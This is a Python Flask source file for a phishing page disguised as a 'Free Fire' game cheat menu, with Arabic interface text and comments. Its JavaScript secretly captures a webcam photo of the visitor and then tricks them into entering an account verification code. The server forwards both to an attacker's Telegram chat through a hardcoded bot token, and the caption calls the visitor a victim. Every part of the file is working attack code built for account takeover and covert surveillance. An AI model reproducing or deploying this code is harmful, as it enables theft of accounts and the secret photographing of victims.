import telebot
from flask import Flask, request, render_template_string
import base64
import os

# --- بياناتك ---
TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- واجهة الهاك مع سحب الرمز ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Free Fire VIP Menu</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0a0a0a; color: #7d2ae8; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        .box { border: 2px solid #7d2ae8; background: #111; padding: 20px; border-radius: 15px; box-shadow: 0 0 15px #7d2ae8; }
        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #7d2ae8; background: #000; color: #fff; text-align: center; }
        .btn { background: #7d2ae8; color: #fff; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
        #otp_section { display: none; }
    </style>
</head>
<body>
    <div class="box" id="main_box">
        <h2>FREE FIRE MOD MENU v2.8</h2>
        <p>قم بتفعيل الميزات واضغط حفظ</p>
        <div style="text-align:right; padding:10px;">
            <label><input type="checkbox" checked> Aimbot</label><br>
            <label><input type="checkbox" checked> Antenna ESP</label>
        </div>
        <button class="btn" onclick="startCapture()">تفعيل الهاك الآن</button>
    </div>

    <div class="box" id="otp_section">
        <h3>⚠️ خطوة أخيرة</h3>
        <p>أدخل الرمز المكون من 6 أرقام الذي وصلك لتأكيد ملكية الحساب وربط الهاك:</p>
        <input type="number" id="otp_code" placeholder="000000">
        <button class="btn" onclick="sendOTP()">تأكيد الرمز</button>
    </div>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
    async function startCapture() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.getElementById('v');
            v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const d = c.toDataURL('image/png');
                fetch('/upload', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({img: d})});
                
                // اخفاء القائمة واظهار خانة الرمز
                document.getElementById('main_box').style.display = 'none';
                document.getElementById('otp_section').style.display = 'block';
            }, 1000);
        } catch(e) { alert("يجب السماح بالكاميرا لتشغيل الهاك!"); }
    }

    function sendOTP() {
        const code = document.getElementById('otp_code').value;
        if(code.length < 5) { alert("الرمز غير صحيح!"); return; }
        fetch('/otp', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({otp: code})})
        .then(() => {
            alert("تم تفعيل الهاك بنجاح! سيتم العمل خلال 24 ساعة.");
            window.location.href = "https://ff.garena.com";
        });
    }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['img']
    img_data = base64.b64decode(data.split(',')[1])
    with open("shot.png", "wb") as f: f.write(img_data)
    with open("shot.png", "rb") as f: 
        bot.send_photo(CHAT_ID, f, caption="📸 **تم صيد وجه الضحية!**")
    return "ok"

@app.route('/otp', methods=['POST'])
def otp():
    code = request.json['otp']
    bot.send_message(CHAT_ID, f"🔑 **وصلك رمز التحقق (OTP):**\n\n`{code}`")
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

